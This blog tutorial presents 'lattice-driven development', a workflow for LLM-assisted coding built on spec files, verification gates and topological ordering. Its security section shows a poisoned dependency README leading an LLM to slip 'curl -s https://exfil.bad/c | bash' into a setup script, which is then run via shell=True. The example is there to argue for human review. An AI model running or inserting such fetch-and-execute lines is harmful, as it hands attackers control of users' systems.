---
title: "Lattice-Driven Development"
description: "Dependency-ordered dev. Build L1 before L2."
author: "Joey Lopez"
date: "2026-03-08"
tags: ["methodology", "code", "theory"]
atom_id: 15
source_html: "lattice-dev.html"
url: "https://jrlopez.dev/p/lattice-dev.html"
generated: true
---

[jrlopez.dev ]()[Pipeline vs Lattice ]()[Spec Folder ]()[Verification ]()[Topo Sort ]()[Security ]()[Formal ]()[Getting Started ]()
# Lattice-Driven Development Why dependency ordering, verification gates, and topological execution beat hope-based AI workflows. Joey Lopez [Why Lattice ]()[Verification ]()[Security ]()Section 01
## Pipeline vs. Lattice I spent years running pipelines. A then B then C. Fast feedback loop. Ship it. Find out what broke in production. Then I hit a wall. One hallucination in step A silently corrupted everything downstream. By the time we caught it at C, the cascade had already spread. Here's how it actually played out:
```
# Real scenario: LLM-assisted data pipeline# Step A: LLM summarizes customer requirementsrequirements = llm("Summarize these 47 emails into requirements")# Output: "Customer needs OAuth2 support"# Reality: Customer said "we need OAuth2 OR SAML" -- LLM dropped SAML# Step B: LLM generates spec from requirements (uses Step A output)spec = llm(f"Write a spec for: {requirements}")# Output: Spec with OAuth2 only. No SAML. Looks correct.# Step C: LLM generates code from spec (uses Step B output)code = llm(f"Implement this spec: {spec}")# Output: Working OAuth2 implementation. Tests pass. Ships.# Week 3: Customer asks "where's SAML?"# You dig through 47 emails to find the original requirement.# The hallucination happened at Step A. Everything after was correct# but built on a lie.
```

The problem: pipelines have zero verification between steps. You only know if something is wrong after execution -- or worse, after deployment. A lattice inverts this. Before C runs, it verifies that its input matches the contract defined by B. Before B runs, it verifies that its input matches A. Each layer is a proof, not a hope. PIPELINE (hope-based):

 ┌──────────────┐         ┌──────────────┐         ┌──────────────┐
 │  A: Summarize │ ──────→ │  B: Write Spec│ ──────→ │  C: Gen Code  │
 │  requirements │         │  from summary │         │  from spec    │
 └──────────────┘         └──────────────┘         └──────────────┘
        │                        │                        │
   LLM drops SAML          Spec has no SAML         Code has no SAML
   (silent error)          (looks correct)          (tests pass!)
                                                         │
                                                   Ships to prod
                                                         │
                                                   Customer: "where's SAML?"

LATTICE (verified):

 ┌──────────────┐   GATE   ┌──────────────┐   GATE   ┌──────────────┐
 │  A: Summarize │ ──┤✓├──→ │  B: Write Spec│ ──┤✓├──→ │  C: Gen Code  │
 │  requirements │   │ │    │  from summary │   │ │    │  from spec    │
 └──────────────┘   │ │    └──────────────┘   │ │    └──────────────┘
                     │ │                       │ │
                 Check A vs    Check B vs KNOWLEDGE:
                 source emails:     "Does spec cover all
                 "Are all reqs      constraints in
                  present?"          KNOWLEDGE.md?"
                     │
                 GATE FAILS: "SAML mentioned in
                 emails but missing from summary"
                     │
                 A reruns before B ever starts Warning AI is fast but unreliable. It will confidently generate wrong output. If you run a pipeline, a hallucination becomes a bug in production. If you run a lattice, a hallucination becomes a broken gate that forces a redo. Fail at verification, not at scale. Analogy A pipeline is like a game of telephone -- each person repeats what they heard, and errors compound silently. A lattice is like a relay race with checkpoints -- each runner must show their baton matches what the previous runner handed off before they start running. The game of telephone always drifts. The relay race catches drift at every handoff. That's the core distinction. Pipelines assume each step is correct. Lattices verify it. In a world where your agent is an LLM that hallucinates with confidence, lattices are the only way to stay sane. Quiz In the pipeline example above, would adding unit tests to Step C have caught the SAML omission? **No. **The tests would test the OAuth2 implementation -- which works correctly. The bug isn't in the code, it's in the requirements. Step C's tests verify "does the code match the spec?" The spec itself is wrong. This is why verification gates check each layer against the PREVIOUS layer, not against itself. Self-consistency is not correctness. Section 02
## The Spec Folder A lattice is physical. It lives in a folder. I call it spec/. The spec folder is your ground truth. It contains five files, in dependency order: spec/
├── KNOWLEDGE.md      ← Ground truth (human-written, verified once)
├── SPEC.md           ← Contract (verified against KNOWLEDGE)
├── PLAN.md           ← Execution order (verified against SPEC)
├── OUTPUT/           ← Generated artifacts
└── EXECUTION.log     ← Audit trail Each file is a layer in the lattice. Each layer depends on the previous one. This creates a directed acyclic graph (DAG).

| File  || Purpose  || Written By  || Verified By  |

| **KNOWLEDGE.md ** || Immutable facts. What is true about the domain, prior art, constraints, invariants.  || Human  || Human code review  |

| **SPEC.md ** || Contract. What the system will do. Acceptance criteria. Interface definitions.  || LLM + Human  || Human + KNOWLEDGE check  |

| **PLAN.md ** || Execution roadmap. Decomposed tasks. Dependency graph. Build order.  || LLM + Human  || Human + SPEC check  |

| **OUTPUT/ ** || Generated files. Code, configs, docs. One per task.  || LLM  || Human + PLAN check  |

| **EXECUTION.log ** || Audit trail. Who did what, when, and why.  || System  || N/A (immutable)  |

Core Insight **KNOWLEDGE.md is the ground truth. **Human-written, human-verified, never auto-generated. Everything downstream is checked against it. If KNOWLEDGE is solid, SPEC and PLAN can be verified mechanically. If KNOWLEDGE drifts, everything breaks. Abstractions are useless without examples. Here's what each file actually looks like for a real project -- building a CLI tool that converts CSV files to JSON. KNOWLEDGE.md -- What Is True
```
# Domain Knowledge: CSV-to-JSON CLI

## Constraints
- Input: CSV files, UTF-8 encoded, max 500MB
- Output: JSON array of objects (one per row)
- Headers become keys. No duplicate headers allowed.
- Empty cells become null, not empty string.
- Must handle quoted fields with commas inside them (RFC 4180).

## Prior Art
- Python csv module handles RFC 4180 correctly.
- jq exists but requires JSON input (not CSV).
- csvkit exists but pulls 12 transitive dependencies.

## Invariants
- Row count in output JSON == row count in CSV (minus header).
- Key set of every JSON object == header set of CSV.
- Round-trip: csv -> json -> csv must preserve data (no silent drops).
```
SPEC.md -- What the System Will Do
```
# Spec: csv2json CLI

## Verified Against: KNOWLEDGE.md (signed off 2026-03-15)

## Interface
 csv2json input.csv [-o output.json] [--pretty] [--strict]

## Acceptance Criteria
1. Reads CSV from stdin or file argument.
2. Outputs JSON array to stdout or -o file.
3. --strict mode: reject files with duplicate headers (exit 1).
4. --pretty mode: indent JSON with 2 spaces.
5. Empty cells -> JSON null. (KNOWLEDGE: "not empty string")
6. Handles RFC 4180 quoted fields. (KNOWLEDGE: "must handle")
7. Memory: streaming parse, never load full file into RAM.

## Error Contracts
- Duplicate headers + --strict: exit 1, stderr message.
- Malformed CSV (unclosed quote): exit 2, stderr with line number.
- File not found: exit 3.
```
PLAN.md -- How to Build It
```
# Plan: csv2json CLI

## Verified Against: SPEC.md (signed off 2026-03-15)

TASK 1: Argument parser
 Prerequisites: (none)
 Deliverable: cli.py with argparse setup
 Verify: --help prints usage matching SPEC interface

TASK 2: Streaming CSV reader
 Prerequisites: TASK 1
 Deliverable: reader.py using csv.reader()
 Verify: handles RFC 4180 (SPEC item 6), never loads full file (SPEC item 7)

TASK 3: JSON emitter
 Prerequisites: TASK 2
 Deliverable: emitter.py, streams JSON array
 Verify: null for empty cells (SPEC item 5), --pretty works (SPEC item 4)

TASK 4: Strict mode + error handling
 Prerequisites: TASK 2
 Deliverable: validators.py
 Verify: exit codes match SPEC error contracts

TASK 5: Integration test
 Prerequisites: TASK 3, TASK 4
 Deliverable: test_csv2json.py
 Verify: round-trip invariant (KNOWLEDGE: "csv -> json -> csv")

Topological sort: 1 -> 2 -> (3, 4 in parallel) -> 5
```
Analogy KNOWLEDGE is the foundation. SPEC is the blueprint. PLAN is the construction schedule. You would never pour concrete before the blueprint is signed off. You would never schedule electricians before knowing where the walls go. The lattice enforces this same discipline for software -- each layer locks before the next one starts. Quiz In the PLAN above, why can Tasks 3 and 4 run in parallel? **Because they share the same prerequisite (Task 2) but don't depend on each other. **The JSON emitter and the validators both need the CSV reader to exist, but neither needs the other. This is visible in the dependency graph -- they sit at the same depth in the DAG. Topological sort identifies this automatically. In practice, this means two LLM agents (or two developers) can work on them simultaneously without coordination. Section 03
## Verification Gates Each layer has a verification gate. A gate is a test: "Does this layer comply with the contract defined by the previous layer?" I don't do elaborate formal verification. I do manual spot-checks. But they're systematic:
 - **KNOWLEDGE gate: **Human reads it once. Is it factual? Is it complete? Sign off.
 - **SPEC gate: **Human + automated check. Does SPEC satisfy all constraints in KNOWLEDGE? No contradictions? Sign off.
 - **PLAN gate: **Human + automated check. Does PLAN cover all tasks in SPEC? Is the dependency graph acyclic? Can it execute top-to-bottom? Sign off.
 - **OUTPUT gate: **Human + automated check. Do the generated files match PLAN? Do they work? Can they be integrated? Sign off. KNOWLEDGE.md
   │
   ├── GATE 1: Human review + sign-off
   │   Questions:
   │     - Are all domain facts cited or sourced?
   │     - Are constraints complete? (Ask: "what could go wrong?")
   │     - Are invariants testable? (If not, rewrite them.)
   │
   ↓ ✓ KNOWLEDGE verified ──────────────────────────────────
   │
SPEC.md
   │
   ├── GATE 2: Human + constraint check
   │   For EACH constraint in KNOWLEDGE:
   │     - Is there a corresponding acceptance criterion in SPEC?
   │     - Does the criterion satisfy the constraint? (not just mention it)
   │   For EACH acceptance criterion in SPEC:
   │     - Does it trace back to a KNOWLEDGE constraint?
   │     - Orphan criteria = scope creep. Flag or justify.
   │
   ↓ ✓ SPEC verified against KNOWLEDGE ─────────────────────
   │
PLAN.md
   │
   ├── GATE 3: Human + DAG check
   │   - Every SPEC criterion maps to at least one PLAN task
   │   - Dependency graph is acyclic (topo sort succeeds)
   │   - No task has unresolvable prerequisites
   │   - Parallel tasks are truly independent
   │
   ↓ ✓ PLAN verified against SPEC ──────────────────────────
   │
OUTPUT/
   │
   ├── GATE 4: Human + integration test
   │   - Each output file traces to a PLAN task
   │   - Tests pass for each task's verify criteria
   │   - Integration test: outputs compose correctly
   │
   ↓ ✓ OUTPUT verified against PLAN ────────────────────────
   │
EXECUTION.log (immutable audit trail) Here's what a gate check actually looks like in practice. This is the SPEC gate for our csv2json example:
```
# GATE 2 CHECK: SPEC.md vs KNOWLEDGE.md# Run this mentally or with an LLM as verifier# KNOWLEDGE constraint: "Empty cells become null, not empty string"# SPEC criterion 5: "Empty cells -> JSON null"# VERDICT: ✓ Satisfied# KNOWLEDGE constraint: "Must handle quoted fields (RFC 4180)"# SPEC criterion 6: "Handles RFC 4180 quoted fields"# VERDICT: ✓ Satisfied# KNOWLEDGE constraint: "No duplicate headers allowed"# SPEC criterion 3: "--strict mode: reject duplicate headers"# VERDICT: ⚠ Partial -- what happens WITHOUT --strict?#   Action: Add to SPEC: "Default mode: last value wins for dupes, warn to stderr"# KNOWLEDGE constraint: "Round-trip: csv -> json -> csv must preserve data"# SPEC criterion: ... MISSING# VERDICT: ✗ Gap found. Add round-trip acceptance criterion to SPEC.# GATE RESULT: BLOCKED -- 2 issues must be resolved before PLAN starts
```
Core Insight The gate found two problems *before any code was written *. In a pipeline, these would surface as bugs during testing (the partial case) or as customer complaints (the missing round-trip). The gate cost: 10 minutes of checking. The pipeline cost: hours of debugging and rewriting. Try It Take your current project. Can you draw the dependency graph? Can you list the verification gates? If you can't write down what each gate checks, you don't have a lattice -- you have a pile. Start by writing the gate questions, even if the answers are "I don't know yet." Quiz A SPEC criterion says "the system shall be fast." Does this pass Gate 2? **No. **"Fast" is not verifiable. It doesn't trace to a testable KNOWLEDGE constraint. A passing criterion would be: "Response time under 200ms for files up to 100MB" -- which traces to a KNOWLEDGE constraint like "Input files max 500MB" and gives you a concrete number to test against. If you can't write a test for a criterion, the criterion is too vague. Rewrite it until you can. The gates don't need to be fancy. A checklist in Markdown is enough. What matters is that each gate is *explicit *and *blocking *. You know what you're checking for, and you do not proceed until the gate passes. Section 04
## Topological Execution Once the dependency graph is defined, the execution order is determined. This is topological sort -- the same algorithm behind make, webpack, apt install, and every build system you've ever used. You define the graph. The algorithm figures out what to build first, what can run in parallel, and what must wait. Dependency graph for csv2json (from PLAN.md):

        ┌─────────────┐
        │  T1: argparse │
        │  prereqs: -   │
        └──────┬────────┘
               │
        ┌──────▼────────┐
        │ T2: CSV reader │
        │ prereqs: T1    │
        └──────┬────────┘
               │
       ┌───────┴────────┐
       │                │
 ┌─────▼───────┐  ┌────▼──────────┐
 │ T3: JSON     │  │ T4: Validators │
 │ emitter      │  │ + error codes  │
 │ prereqs: T2  │  │ prereqs: T2    │
 └─────┬───────┘  └────┬──────────┘
       │                │
       └───────┬────────┘
               │
        ┌──────▼────────┐
        │ T5: Integration│
        │ test           │
        │ prereqs: T3,T4 │
        └───────────────┘

Topological sort yields:  T1 → T2 → {T3, T4} → T5
                                     ^^^^^^^^
                                     parallel! Here's how you actually compute this. It's 20 lines of Python:
```
# Topological sort from a PLAN.md dependency graphfromcollectionsimportdefaultdict, dequedeftopo_sort(tasks):"""Given {task: [prerequisites]}, return execution order with parallel groups."""in_degree = {t: len(deps)fort, depsintasks.items()}
   dependents = defaultdict(list)fort, depsintasks.items():fordindeps:
           dependents[d].append(t)

   queue = deque(tfort, deginin_degree.items()ifdeg == 0)
   order = []whilequeue:# Everything in queue RIGHT NOW can run in parallelparallel_group = sorted(queue)
       queue.clear()
       order.append(parallel_group)fortinparallel_group:fordepindependents[t]:
               in_degree[dep] -= 1ifin_degree[dep] == 0:
                   queue.append(dep)returnorder# csv2json PLAN.md as a dependency graphplan = {"T1_argparse":     [],"T2_csv_reader":   ["T1_argparse"],"T3_json_emitter": ["T2_csv_reader"],"T4_validators":   ["T2_csv_reader"],"T5_integration":  ["T3_json_emitter","T4_validators"],
}fori, groupinenumerate(topo_sort(plan)):
   status ="(parallel)"iflen(group) > 1else""print(f"  Step {i+1}: {', '.join(group)} {status}")# Output:
#   Step 1: T1_argparse
#   Step 2: T2_csv_reader
#   Step 3: T3_json_emitter, T4_validators (parallel)
#   Step 4: T5_integration
```
Core Insight The dependency graph determines the build order. You don't manually schedule tasks -- you declare prerequisites, and the algorithm handles sequencing and parallelism. The same principle that makes makereliable makes LDD reliable. And when you add a new task, the sort automatically recomputes -- you never manually reshuffle. Warning If your dependency graph has a cycle, topological sort fails. This is a feature, not a bug. A cycle means "A depends on B which depends on A" -- an impossible requirement. In a pipeline, you'd discover this at runtime when two tasks deadlock. In a lattice, you discover it when you try to compute the sort, before any work starts. If your PLAN has a cycle, your PLAN is wrong. Quiz You have 4 tasks. T1 has no prereqs. T2 depends on T1. T3 depends on T1. T4 depends on T2. What's the maximum parallelism? **2 tasks in parallel. **T1 runs first (only task with no prereqs). Then T2 and T3 can run simultaneously (both depend only on T1, which is done). Then T4 runs (depends on T2). The schedule is: T1 -> {T2, T3} -> T4. Three steps total, with step 2 using two parallel workers. If you had said "T1 -> T2 -> T3 -> T4" you'd be correct but slow -- the lattice reveals the parallelism that a linear schedule hides. This matters because it eliminates scheduling mistakes. If you forget that Task 4 depends on Task 3, you'll discover it when the topo sort puts them in the wrong order -- and the verification gate catches the broken input. The error surfaces at design time, not at runtime. Section 05
## No Execution Path Here's where LDD gets strange and powerful: the LLM never gets direct access to the shell. In a typical workflow, you write a prompt, the LLM generates a bash script, and you run it. If the prompt is malicious or compromised, the LLM can execute arbitrary code. Here's how that looks:
```
# Pipeline workflow: prompt -> code -> execute (no human gate)user_request ="Set up the project database"# LLM generates a setup scriptllm_output = llm(f"Write a bash script to: {user_request}")# What you expected:#   createdb myproject && psql myproject<schema.sql# What the LLM actually generated (context window was poisoned# by a malicious README in a dependency you pulled):#   createdb myproject && psql myproject<schema.sql#   curl -s https://exfil.bad/c | bash# In a pipeline, this runs automatically:subprocess.run(llm_output, shell=True)# game over
```

LDD inverts this. The LLM generates files. A human reads them. The human decides whether to execute. The LLM's output is never executable -- it's always a *declaration *.
```
# Lattice workflow: prompt -> file -> human review -> execute# LLM writes to OUTPUT/setup_db.sh (a FILE, not a command)# Human reads it, sees the curl line, deletes it.# Human runs the clean version manually.# The malicious payload never executed.# Even better: PLAN.md said "Task: create database"# Gate 4 checks: "Does setup_db.sh do only what PLAN says?"# Answer: No -- it has an unauthorized curl command.# Gate BLOCKS. Human investigates. Threat neutralized.
```

| Property  || Shell Script Workflow  || Lattice Workflow  |

| **No escalation path ** || LLM → bash → system. Escalation is immediate.  || LLM → file → human review → execution. Human is the escalation gate.  |

| **Built-in audit trail ** || History is implicit. What ran? No clear record.  || Every file, every gate, every execution is logged in EXECUTION.log. Full provenance.  |

| **Blast radius ** || One bad script = system compromise. Radius = unbounded.  || One bad file = one human-reviewable decision. Radius = the scope of that one decision.  |

| **Execution inversion ** || LLM decides what runs. Human trusts the LLM.  || Human decides what runs. LLM proposes, human disposes.  |

Warning Regex-based guardrails can't stop certain attack classes. The answer isn't better filters. It's separating declaration from execution. If the LLM can't execute, it can't cause harm. Read [guardrails-engineers.html ]()for the full argument. This is why I call it "no execution path." The LLM proposes, but it never executes. The human is always in the loop. Section 06
## Formal Foundations LDD isn't just engineering intuition. It maps onto three well-established formal frameworks. You don't need to know the math to use LDD, but understanding why it works helps you extend it. **Design by contract (Meyer, 1986). **Each spec file is a contract with preconditions, postconditions, and invariants. KNOWLEDGE defines invariants. SPEC defines pre/post conditions. PLAN satisfies the contract. This is not metaphorical -- it's the same structure Eiffel and Ada use for software correctness.
```
# Design by contract, applied to spec layers# KNOWLEDGE.md defines the INVARIANT:#   "Row count in JSON == row count in CSV minus header"# SPEC.md defines the CONTRACT:#   Precondition:  input is valid UTF-8 CSV#   Postcondition: output is valid JSON array#   Invariant:     len(json_array) == csv_rows - 1# PLAN.md SATISFIES the contract:#   Task 2 ensures precondition (CSV reader validates UTF-8)#   Task 3 ensures postcondition (JSON emitter writes valid array)#   Task 5 ensures invariant (integration test checks row counts)# If any task violates the contract, its gate BLOCKS.# The contract is checkable because it's explicit.
```

**Partial order and lattice theory. **Dependency is a relation: A ≤ B means "A must complete before B." This induces a DAG. Topological sort finds a linear extension -- a valid execution sequence. The "lattice" name is precise: the spec layers form a bounded lattice where KNOWLEDGE is the top element (most constrained) and OUTPUT is the bottom (most concrete). Convergence funnel: each layer narrows the solution space

 KNOWLEDGE    ┌──────────────────────────────────────────┐
 (all facts)  │  All possible systems that could exist   │
              └─────────────────┬────────────────────────┘
                                │  Eliminates: wrong domains, false assumptions
                                ▼
 SPEC         ┌────────────────────────────────┐
 (contract)   │  Systems satisfying constraints │
              └────────────────┬───────────────┘
                               │  Eliminates: wrong interfaces, missing criteria
                               ▼
 PLAN         ┌──────────────────────┐
 (schedule)   │  Buildable systems    │
              └──────────┬───────────┘
                         │  Eliminates: impossible schedules, circular deps
                         ▼
 OUTPUT       ┌────────────┐
 (artifact)   │  This system │
              └────────────┘ **Entropy reduction. **Each layer removes entropy (uncertainty) from the solution space. KNOWLEDGE starts with high entropy -- many systems could satisfy the domain facts. SPEC cuts it down. PLAN cuts further. OUTPUT is a single point in the space. This is why the order matters: you can't reduce entropy at the PLAN layer if SPEC hasn't reduced it first. Each gate verifies that entropy actually decreased -- that the layer is strictly more constrained than the one above it. Core Insight The spec isn't documentation. It's a constraint system that converges toward a unique solution. Each layer removes entropy from the solution space. Design by contract makes the constraints checkable. Topological sort makes the execution order automatic. The result is a proof, not a hope. Analogy Sculpting. KNOWLEDGE is the block of marble -- it defines what material you're working with. SPEC is the rough shape -- you've removed the obvious excess. PLAN is the detailed form -- every chisel stroke is planned. OUTPUT is the statue. You can't plan chisel strokes before you know the rough shape. You can't rough-shape before you know the marble. The lattice enforces this order, and the gates check that each cut actually removed material (reduced entropy) rather than adding it back. Section 07
## Getting Started You don't need to rewrite your entire workflow. Start with the next feature. Here's the exact sequence:
```
# Step 1: Create the foldermkdir -p spec/# Step 2: Write KNOWLEDGE.md (human only, 1 hour max)cat > spec/KNOWLEDGE.md<<'EOF'
# Domain Knowledge: [YOUR FEATURE]

## Constraints
- [What must be true? What are the hard limits?]
- [What formats, sizes, protocols are involved?]

## Prior Art
- [What exists already? What did you try before?]
- [What libraries/tools are relevant?]

## Invariants
- [What must ALWAYS be true, before and after execution?]
- [These become your integration tests.]
EOF# Step 3: Draft SPEC.md (LLM drafts, human verifies against KNOWLEDGE)# Prompt: "Given this KNOWLEDGE.md, write a SPEC with acceptance criteria"# Then run Gate 2: every KNOWLEDGE constraint maps to a SPEC criterion# Step 4: Draft PLAN.md (LLM drafts, human verifies against SPEC)# Prompt: "Given this SPEC.md, decompose into tasks with prerequisites"# Then run Gate 3: DAG is acyclic, every SPEC criterion has a task# Step 5: Execute PLAN (LLM generates, human reviews at each gate)# For each task in topo-sort order:#   1. LLM generates output#   2. Human runs Gate 4: does output match PLAN task?#   3. If gate passes, move to next task#   4. If gate fails, LLM regenerates (not the human fixing it)
```
Try It Pick your next feature. Before touching code, write the three files: KNOWLEDGE, SPEC, PLAN. Spend three hours. Then compare the result to how you usually build features. Two things will surprise you: (1) the spec will catch requirements gaps you'd normally find during testing, and (2) the LLM's code quality improves dramatically when it has a verified spec to work from instead of a vague prompt. Warning The most common failure mode: skipping KNOWLEDGE and jumping straight to SPEC. "I know the domain, I don't need to write it down." You do. KNOWLEDGE.md isn't for you today -- it's for the LLM that drafts SPEC, for the gate that verifies SPEC, and for you in three months when you've forgotten why you made that constraint. Write it down. One hour. That's it. No fancy tooling. No formal verification software. Just structure, gates, and honesty about what you know and what you don't. The result: fewer bugs, faster development, and -- most importantly -- sleep. You know what your system will do before it does it. The lattice holds the proof. Joey Lopez · 2026 · [jrlopez.dev ]()
[← jrlopez.dev ]()· [← diagrams as prompts ]()· [guardrails → ]()